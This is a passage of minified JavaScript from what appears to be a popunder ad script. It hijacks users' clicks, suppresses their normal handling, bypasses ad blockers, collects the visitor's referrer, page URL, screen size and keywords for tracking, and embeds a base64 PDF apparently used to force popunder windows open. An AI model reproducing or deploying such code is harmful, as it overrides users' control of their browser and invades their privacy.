navigator.mimeTypes["application/x-shockwave-flash"]&&navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin)return!0;try{return new ActiveXObject("ShockwaveFlash.ShockwaveFlash"),!0}catch(a){}return!1},AjaxLoad:function(a,b){if("undefined"!==typeof XMLHttpRequest)var c=new XMLHttpRequest;else for(var g=["MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"], h=0,l=g.length;h<l;h++)try{c=new ActiveXObject(g[h]);break}catch(d){}c.onreadystatechange=function(){4>c.readyState||200===c.status&&4===c.readyState&&b(c)};c.open("GET",a,!0);c.send()},ConsoleGroup:function(a){e.DebugEnabled&&window.console&&window.console.group&&console.group(a)},ConsoleGroupEnd:function(){e.DebugEnabled&&window.console&&window.console.groupEnd&&console.groupEnd()},ConsoleLog:function(a){e.DebugEnabled&&window.console&&window.console.log&&console.log(a)},BasePopunder:{mouseDownHandler:function(a, b){var c=e;if("mousedown"==a.type&&0!=a.button)return!1;if("mousedown"==a.type){var g=document.documentElement.clientWidth,h=document.documentElement.clientHeight;if(a.target&&(a.target===document.documentElement||a.target===document)&&(a.clientX>g||a.clientY>h))return!1}if(!this.shouldHandleEvent(b,!0))return!1;c.PopRunning=!0;e.IsFeatureEnabled("IsSkipUserEventPropagation")||(a.preventDefault(),a.stopImmediatePropagation(),a.stopPropagation());return!0},shouldHandleEvent:function(a,b){var c=e,g= c.IsFastPop&&!c.AbortFastPop?c.PopSettings.ClientSideFilters:a.ClientSideFilters,h=c.IsFastPop&&!c.AbortFastPop?c.FastPopZone:{Id:a.ZoneId,Name:a.ZoneName};return(!b||!c.PopRunning)&&!c.PopLoaded&&!(c.IsFastPop&&!c.AbortFastPop&&c.IsFastPopCapped())&&c.IsClientSideFiltersPassed(g,c.LogZoneFilter(h))},execute:function(a,b,c,g){g=g||a.target||a.srcElement;var h=e;h.EventObject=a;if(h.IsFastPop&&!h.AbortFastPop){if(h.PopLoaded||h.IsFastPopCapped()){if(e.IsFeatureEnabled("IsSkipTriggerClick")){if(!g)return!1; h.PopRunning=!1}else this.triggerClick(g,b);return!1}if(h.IsDontTriggerForSelectorMatch(h.PopSettings.PopUnderDontTriggerSelector,g)){if(e.IsFeatureEnabled("IsSkipTriggerClick")){if(!g)return!1;h.PopRunning=!1}else this.triggerClick(g,b);return!1}if(h.PopSettings.PopUnderTriggerOnSelector&&!h.IsTriggerOnSelectorMatch(h.PopSettings.PopUnderTriggerOnSelector,g,h.PopSettings.PopUnderTriggerOnSelectorDepth)){if(e.IsFeatureEnabled("IsSkipTriggerClick")){if(!g)return!1;h.PopRunning=!1}else this.triggerClick(g, b);return!1}a=c?h.GetParentLink(g):g;if(h.PopSettings.RespectTargetBlank&&a.getAttribute&&("_blank"===a.getAttribute("target")||"nofollow"===a.getAttribute("rel"))||h.IsIgnoreElement(g))return this.triggerClick(g,b),!1}else{if(h.PopLoaded||h.IsCapped("InfNumPops"+h.PopMedia.ZoneId,"InfNumPopsExpire"+h.PopMedia.ZoneId,h.PopMedia.Settings.cap))return this.triggerClick(g,b),!1;a=c?h.GetParentLink(g):g;if(h.PopMedia.Settings.RespectTargetBlank&&a.getAttribute&&("_blank"===a.getAttribute("target")||"nofollow"=== a.getAttribute("rel"))||h.IsDontTriggerForSelectorMatch(h.PopMedia.Settings.PopUnderDontTriggerSelector,g))return this.triggerClick(g,b),!1;if(h.PopMedia.Settings.PopUnderTriggerOnSelector&&!h.IsTriggerOnSelectorMatch(h.PopMedia.Settings.PopUnderTriggerOnSelector,g,h.PopMedia.Settings.PopUnderTriggerOnSelectorDepth)){if(e.IsFeatureEnabled("IsSkipTriggerClick")){if(!g)return!1;h.PopRunning=!1}else this.triggerClick(g,b);return!1}if(h.IsIgnoreElement(g))return this.triggerClick(g,b),!1;h.IncrementCap("InfNumPops"+ h.PopMedia.ZoneId,"InfNumPopsExpire"+h.PopMedia.ZoneId,h.PopMedia.Settings.capLength)}return!0},triggerClick:function(a,b){var c=e;try{if(a){for(var g=c.EventObject,h="click"===b?["click"]:["mousedown","mouseup","click"],l=0;l<h.length;l++){var d=c._Top.document.createEvent("MouseEvents");d.initMouseEvent(h[l],!0,!0,window,1,g?g.screenX:0,g?g.screenY:0,g?g.clientX:0,g?g.clientY:0,!1,!1,!1,!1,0,null);a.dispatchEvent(d)}c.PopRunning=!1}}catch(f){c.ConsoleLog(f)}},getWindowName:function(){return"win_"+ (new Date).getTime().toString()},postWindowPop:function(){var a=e;a.PopRunning=!1;a.Storage.SetSessionStorage("InfChromePopEventAttached",!1);a.IsFastPop?(a.IncrementFastPopCap(),a.OnFastPopLoaded()):(a.PopLoaded=!0,"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback())},buildUrl:function(a,b){if(null==a)return null;if(e.IsAdblockRequest)return a.replace("SelectedPopTypePlaceholder",null==b?"null":b);if(null==b||-1!=a.indexOf("spt="))return a;var c=-1!=a.indexOf("?");return a+ (c?"&":"?")+"spt="+b},getFastPopUrl:function(){var a=e,b=a.InfinityHost,c=encodeURIComponent((new Date).getTimezoneOffset()),g=encodeURIComponent(a._Top.document.referrer),h=encodeURIComponent(a._Top.window.location.href),l=encodeURIComponent(this._randomString);return b+(a.IsAdblockRequest?"/fp.rb?":"/fp.engine?")+"id="+a.Guid+"&rand="+l+"&ver="+a.Version+"&time="+c+"&referrerUrl="+g+"&subId="+(0<a.SubID.length?a.SubID:"")+"&tid="+(0<a.TId.length?a.TId:"")+"&abr="+a.IsAdblockRequest+"&stdTime="+ a.GetStdTimezoneOffset()+"&res="+a.GetScreenWidth()+"x"+a.GetScreenHeight()+"&fpe="+a.GetSupportedVideo()+"&curl="+h+"&kw="+encodeURIComponent(a.GetKeywords())}},ChromePopunder:{_guid:null,_showPdf:"data:application/pdf;base64,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